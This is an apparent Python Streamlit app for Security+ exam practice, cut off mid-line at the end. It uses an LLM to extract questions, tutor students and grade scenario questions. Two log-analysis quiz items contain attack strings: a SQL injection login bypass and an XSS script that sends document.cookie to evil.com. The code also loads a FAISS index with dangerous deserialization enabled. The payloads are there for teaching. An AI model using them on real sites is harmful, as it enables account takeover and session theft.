import streamlit as st
import os
import time
import random
import urllib.parse
from dotenv import load_dotenv
from langchain_groq import ChatGroq
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_community.vectorstores import FAISS
from langchain_core.prompts import PromptTemplate
from langchain_core.output_parsers import StrOutputParser

# 1. PAGE CONFIGURATION
load_dotenv()
st.set_page_config(page_title="Security+ SY0-701 Adaptive Sim", page_icon="🛡️", layout="wide")

# 2. SECURE RESOURCE LOADING
@st.cache_resource
def load_resources():
    api_key = st.secrets.get("GROQ_API_KEY") or os.getenv("GROQ_API_KEY")
    if not api_key:
        st.error("🔑 GROQ_API_KEY is missing in Streamlit Secrets!")
        st.stop()
    try:
        embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
        vectorstore = FAISS.load_local("faiss_index", embeddings, allow_dangerous_deserialization=True)
        llm = ChatGroq(temperature=0, model_name="llama-3.3-70b-versatile", groq_api_key=api_key)
        return vectorstore, llm
    except Exception as e:
        st.error(f"Critical Initialization Error: {e}")
        return None, None

# 3. AI LOGIC: INVISIBLE ADAPTIVE PARSER
def get_adaptive_question(llm, raw_text, difficulty):
    template = """
    Extract ONE CompTIA Security+ question EXACTLY as written. 
    DIFFICULTY TARGET: {difficulty}
    If the text is a disclaimer or doesn't match, return: SKIP.
    RAW TEXT: {raw_text}
    FORMAT:
    QUESTION: [text]
    A: [text]
    B: [text]
    C: [text]
    D: [text]
    CORRECT: [A, B, C, or D]
    CRITICAL INSTRUCTION: Stop generating text immediately after providing the single CORRECT letter.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"raw_text": raw_text[:1200], "difficulty": difficulty})

# 4. AI LOGIC: ADAPTIVE TEACHING TUTOR
def get_tutor_feedback(llm, question, user_ans, correct_letter, is_right, difficulty):
    result_text = "Correct" if is_right else "Incorrect"
    template = """
    You are an expert CompTIA Security+ Tutor. 
    Question: {question}
    Student Choice: {user_ans}
    Correct Answer: {correct_letter}
    Result: {result}
    Student's Current Hidden Level: {difficulty}
    
    Task: Write a smooth explanation.
    1. EASY Level: Use a simple, real-world analogy. Focus on building confidence.
    2. HARD Level: Go deeper into the technical "why" and provide an advanced pro-tip.
    3. Explicitly state why the correct answer is the BEST choice and the flaw in their selection.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"question": question, "user_ans": user_ans, "correct_letter": correct_letter, "result": result_text, "difficulty": difficulty})

# 5. AI LOGIC: TOPIC EXTRACTOR & PBQ GRADER
def get_video_topic(llm, question):
    template = "Analyze this Security+ question and extract the ONE core concept in 2 to 4 words. Question: {question}\nOutput ONLY the short topic name."
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"question": question})

def grade_pbq(llm, pbq_title, pbq_scenario, user_answers):
    template = """
    You are a friendly, encouraging CompTIA PBQ Grader.
    PBQ Title: {title}
    Scenario: {scenario}
    Student's Submitted Answers: {answers}
    
    Task:
    1. Tell the student if they got the configuration completely right, partially right, or wrong.
    2. Go through their answers and explain the "Why" using simple terms.
    3. Provide the definitive correct configuration at the end.
    
    CRITICAL INSTRUCTION:
    If the student got EVERY single part 100% correct, you MUST put the exact phrase "[PASSED]" at the very end of your response. 
    If they got ANYTHING wrong (even partially), you MUST put the exact phrase "[FAILED]" at the very end of your response.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"title": pbq_title, "scenario": pbq_scenario, "answers": str(user_answers)})

# 6. PBQ DATABASE (Guided with Word Banks & Video Topics)
PBQ_DB = {
    1: {"topic": "Network Ports", "title": "Port Configuration", "desc": "Match the correct default port number to the network service.", "type": "match", "keys": ["SSH", "HTTPS", "RDP", "DNS"], "options": ["22", "23", "53", "80", "443", "3389"]},
    2: {"topic": "Multifactor Authentication", "title": "Authentication Factors", "desc": "Categorize the MFA security factors.", "type": "match", "keys": ["Password", "Smartcard", "Retina Scan", "PIN"], "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"]},
    3: {"topic": "Malware Types", "title": "Malware Identification", "desc": "Match the malicious behavior to the correct malware type.", "type": "match", "keys": ["Encrypts files and demands payment", "Hides deep in the OS kernel", "Self-replicates across the network", "Disguises itself as legitimate software"], "options": ["Ransomware", "Rootkit", "Worm", "Trojan", "Spyware"]},
    4: {"topic": "Incident Response Phases", "title": "Incident Response Lifecycle", "desc": "Select the correct phase of Incident Response in order.", "type": "order", "keys": ["Step 1", "Step 2", "Step 3", "Step 4"], "options": ["Preparation", "Identification", "Containment", "Eradication", "Recovery", "Lessons Learned"]},
    5: {"topic": "Cryptography", "title": "Cryptography Types", "desc": "Classify the encryption algorithm as Symmetric or Asymmetric.", "type": "match", "keys": ["AES", "RSA", "DES", "ECC"], "options": ["Symmetric", "Asymmetric", "Hashing"]},
    6: {"topic": "Cloud Deployment Models", "title": "Cloud Deployment Models", "desc": "Classify the service as IaaS, PaaS, or SaaS.", "type": "match", "keys": ["AWS EC2 (Virtual Servers)", "Salesforce (Web CRM)", "Google App Engine", "Microsoft Azure VMs"], "options": ["Infrastructure as a Service (IaaS)", "Platform as a Service (PaaS)", "Software as a Service (SaaS)"]},
    7: {"topic": "Firewall Rules", "title": "Basic Firewall Rule", "desc": "Create a rule to strictly BLOCK web traffic (HTTP) coming from the IP 192.168.1.50.", "type": "firewall"},
    8: {"topic": "RAID Configuration", "title": "RAID Configuration", "desc": "Select the best RAID setup for the given business scenario.", "type": "match", "keys": ["High Performance, Zero Fault Tolerance", "Exact Mirroring (Redundancy)", "Striping with Parity (Min 3 drives)"], "options": ["RAID 0", "RAID 1", "RAID 5", "RAID 10"]},
    9: {"topic": "SQL Injection", "title": "Log Analysis: Database Attack", "desc": "Look at the web log and identify what type of attack is happening.", "type": "log", "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321', "options": ["SQL Injection", "Cross-Site Scripting (XSS)", "Buffer Overflow", "DDoS"]},
    10: {"topic": "Cross-Site Scripting XSS", "title": "Log Analysis: Malicious Script", "desc": "Analyze the log and identify the attack vector targeting user browsers.", "type": "log", "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200', "options": ["Cross-Site Scripting (XSS)", "SQL Injection", "Command Injection", "CSRF"]},
    11: {"topic": "Digital Certificates PKI", "title": "Digital Certificates", "desc": "Match the PKI component to its definition.", "type": "match", "keys": ["Used to encrypt data sent to a server", "Kept secret by the server to decrypt data", "A list of revoked/bad certificates"], "options": ["Public Key", "Private Key", "CRL (Certificate Revocation List)", "CSR"]},
    12: {"topic": "Firewall ACL Troubleshooting", "title": "Advanced ACL Troubleshooting", "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the secure website (HTTPS) at 10.2.2.10. Which rule number is causing the block?", "type": "log", "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL", "options": ["Rule 1", "Rule 2", "Rule 3", "Rule 4"]}
}

# 7. MAIN APPLICATION
def main():
    st.title("🛡️ Security+ SY0-701 Pro Simulator")
    vectorstore, llm = load_resources()
    if not vectorstore: return

    # --- STATE INITIALIZATION ---
    if 'app_mode' not in st.session_state:
        st.session_state.clear()
        docs = vectorstore.similarity_search("Security+ practice question", k=150)
        random.shuffle(docs)
        
        st.session_state.all_docs = docs
        st.session_state.db_idx = 0         
        st.session_state.display_idx = 1    
        st.session_state.correct_count = 0  
        st.session_state.wrong_count = 0    
        st.session_state.streak = 0
        st.session_state.difficulty = "NORMAL"
        
        st.session_state.current_q = None   
        st.session_state.phase = "answering" 
        st.session_state.feedback = ""
        st.session_state.user_choice = None
        st.session_state.is_right = False
        st.session_state.rehab_topic = ""
        
        st.session_state.app_mode = "Adaptive Simulator"
        st.session_state.pbq_feedback = ""
        st.session_state.current_pbq_id = None

    # --- SIDEBAR NAVIGATION ---
    with st.sidebar:
        st.header("🧭 Exam Navigation")
        selected_mode = st.radio("Select Training Mode:", ["Adaptive Simulator", "PBQ Practice Lab"])
        
        if selected_mode != st.session_state.app_mode:
            st.session_state.app_mode = selected_mode
            st.rerun()

        st.markdown("---")
        
        if st.session_state.app_mode == "Adaptive Simulator":
            st.header("📊 Exam Progress")
            st.write(f"**Question:** {st.session_state.display_idx} / 90")
            st.success(f"✅ Correct: {st.session_state.correct_count}")
            st.error(f"❌ Wrong: {st.session_state.wrong_count}")
        
        st.markdown("---")
        st.header("📺 Quick Review Topics")
        st.write("Watch Professor Messer lessons anytime:")
        topics = ["1.0 General Concepts", "2.0 Threats & Mitigations", "3.0 Architecture", "4.0 Security Operations", "5.0 Program Management"]
        for topic in topics:
            query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
            st.markdown(f"- [{topic}](https://www.youtube.com/results?search_query={query})")
            
        st.markdown("---")
        if st.button("🔄 Reset Entire App"):
            st.session_state.clear()
            st.rerun()

    # ==========================================
    # MODE 1: PBQ PRACTICE LAB (DYNAMIC & GUIDED)
    # ==========================================
    if st.session_state.app_mode == "PBQ Practice Lab":
        st.header("💻 Performance-Based Questions (PBQs)")
        st.write("PBQs test your hands-on ability. Select a scenario below. Difficulty increases from 1 to 12.")
        
        pbq_id = st.selectbox("Select PBQ Scenario:", list(PBQ_DB.keys()), format_func=lambda x: f"PBQ {x}: {PBQ_DB[x]['title']} (Level {x})")
        pbq = PBQ_DB[pbq_id]
        
        # --- SHUFFLE LOGIC: Only shuffle once when a new PBQ is selected ---
        if st.session_state.get('current_pbq_id') != pbq_id:
            st.session_state.current_pbq_id = pbq_id
            st.session_state.pbq_feedback = ""
            
            if 'keys' in pbq:
                st.session_state.pbq_keys = random.sample(pbq['keys'], len(pbq['keys']))
            if 'options' in pbq:
                st.session_state.pbq_opts = random.sample(pbq['options'], len(pbq['options']))
        
        st.info(f"**Scenario:** {pbq['desc']}")
        
        user_submission = {}
        with st.form(f"pbq_form_{pbq_id}"):
            if pbq['type'] in ["match", "order", "log"]:
                if 'log' in pbq:
                    st.code(pbq['log'], language='bash')

                if 'options' in pbq:
                    shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
                    st.write("### 🗂️ Word Bank / Available Options")
                    st.info(" | ".join(shuffled_opts))
                    st.write("---")

                if 'keys' in pbq:
                    col1, col2 = st.columns(2)
                    shuffled_keys = st.session_state.get('pbq_keys', pbq['keys'])
                    for i, key in enumerate(shuffled_keys):
                        with (col1 if i % 2 == 0 else col2):
                            user_submission[key] = st.selectbox(f"{key}:", ["-- Select --"] + shuffled_opts)
                else:
                    if 'options' in pbq:
                        shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
                        user_submission['Answer'] = st.selectbox("Select the correct finding:", ["-- Select --"] + shuffled_opts)

            elif pbq['type'] == "firewall":
                col1, col2, col3, col4 = st.columns(4)
                user_submission['Action'] = col1.selectbox("Action", ["-- Select --", "ALLOW", "DENY"])
                user_submission['Protocol'] = col2.selectbox("Protocol", ["-- Select --", "TCP", "UDP", "HTTP", "ANY"])
                user_submission['Source IP'] = col3.text_input("Source IP (e.g., 192.168.x.x)")
                user_submission['Dest Port'] = col4.selectbox("Dest Port", ["-- Select --", "22", "53", "80", "443", "ANY"])

            submit_pbq = st.form_submit_button("Submit PBQ for Grading")
        
        if submit_pbq:
            if any(val == "-- Select --" or val == "" for val in user_submission.values()):
                st.error("⚠️ Please select an answer for all fields before submitting.")
            else:
                with st.spinner("AI Tutor is grading your PBQ..."):
                    st.session_state.pbq_feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
        
        # --- PBQ FEEDBACK & VIDEO REHAB LOGIC ---
        if st.session_state.pbq_feedback:
            st.markdown("---")
            raw_feedback = st.session_state.pbq_feedback
            
            # Detect Grade
            passed = "[PASSED]" in raw_feedback
            failed = "[FAILED]" in raw_feedback
            
            # Clean tags out of UI
            clean_feedback = raw_feedback.replace("[PASSED]", "").replace("[FAILED]", "").strip()
            
            st.warning("🤖 **AI PBQ Evaluation & Grade:**")
            st.write(clean_feedback)
            
            # If they missed anything, drop the video link
            if failed:
                topic = pbq.get('topic', 'CompTIA Security+')
                query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
                st.error("🛑 It looks like you missed some parts of this PBQ.")
                st.markdown(f"### 📺 [Click Here to Watch a Review Lesson on '{topic}'](https://www.youtube.com/results?search_query={query})")
            elif passed:
                st.success("🏆 Perfect Score! Excellent job on this PBQ.")

            if st.button("Clear Feedback & Try Again"):
                st.session_state.pbq_feedback = ""
                # Re-shuffles the next time because current_pbq_id logic triggers on next render if we force it
                st.session_state.current_pbq_id = None 
                st.rerun()

    # ==========================================
    # MODE 2: ADAPTIVE SIMULATOR (ORIGINAL)
    # ==========================================
    elif st.session_state.app_mode == "Adaptive Simulator":
        if st.session_state.streak >= 3: st.session_state.difficulty = "HARD"
        elif st.session_state.streak <= -3: st.session_state.difficulty = "EASY"
        else: st.session_state.difficulty = "NORMAL"

        if st.session_state.display_idx > 90:
            st.balloons()
            st.success(f"🎉 Exam Finished! Final Score: {st.session_state.correct_count} / 90")
            return

        if st.session_state.current_q is None:
            with st.spinner("AI Tutor is finding your next question..."):
                while st.session_state.db_idx < len(st.session_state.all_docs):
                    time.sleep(1.2)
                    raw_content = st.session_state.all_docs[st.session_state.db_idx].page_content
                    formatted = get_adaptive_question(llm, raw_content, st.session_state.difficulty)
                    if "SKIP" not in formatted and "QUESTION:" in formatted:
                        try:
                            q_text = formatted.split("QUESTION:")[1].split("A:")[0].strip()
                            a_opt = formatted.split("A:")[1].split("B:")[0].strip()
                            b_opt = formatted.split("B:")[1].split("C:")[0].strip()
                            c_opt = formatted.split("C:")[1].split("D:")[0].strip()
                            d_opt = formatted.split("D:")[1].split("CORRECT:")[0].strip()
                            correct_letter = formatted.split("CORRECT:")[1].strip()[0].upper()
                            
                            st.session_state.current_q = {
                                "text": q_text, "options": [f"A: {a_opt}", f"B: {b_opt}", f"C: {c_opt}", f"D: {d_opt}"], "correct_letter": correct_letter
                            }
                            break 
                        except Exception: st.session_state.db_idx += 1 
                    else: st.session_state.db_idx += 1 

        if st.session_state.current_q is None:
            st.error("Ran out of study material.")
            return

        cq = st.session_state.current_q
        
        # ANSWERING PHASE
        if st.session_state.phase == "answering":
            st.subheader(f"Question {st.session_state.display_idx}")
            st.info(cq["text"])
            selected_option = st.radio("Select your answer:", cq["options"], index=None)

            if st.button("Submit Answer"):
                if selected_option is None: st.warning("⚠️ Please select an answer.")
                else:
                    user_letter = selected_option.split(":")[0].strip()
                    is_right = (user_letter == cq["correct_letter"])
                    
                    if is_right:
                        st.session_state.correct_count += 1
                        st.session_state.streak = st.session_state.streak + 1 if st.session_state.streak > 0 else 1
                    else:
                        st.session_state.wrong_count += 1
                        st.session_state.streak = st.session_state.streak - 1 if st.session_state.streak < 0 else -1
                    
                    st.session_state.user_choice = selected_option
                    st
